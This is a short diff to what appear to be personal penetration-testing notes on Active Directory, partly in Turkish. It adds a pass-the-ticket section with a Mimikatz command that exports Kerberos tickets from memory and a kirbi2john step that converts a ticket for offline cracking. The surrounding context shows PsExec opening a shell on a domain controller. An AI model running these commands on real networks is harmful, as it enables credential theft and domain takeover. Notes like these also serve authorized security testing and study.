@@ -74,6 +74,14 @@ misc::cmd
 
 PsExec64.exe \\dc01 cmd.exe # powershell veya cmd acildiginda dcye baglan
 
+PTT:
+
+sekurlsa::tickets /export
+
+/usr/share/kerberoast/kirbi2john.py mssqlsvc.kirbi      
+
+
+
 
 
 ### PowerView
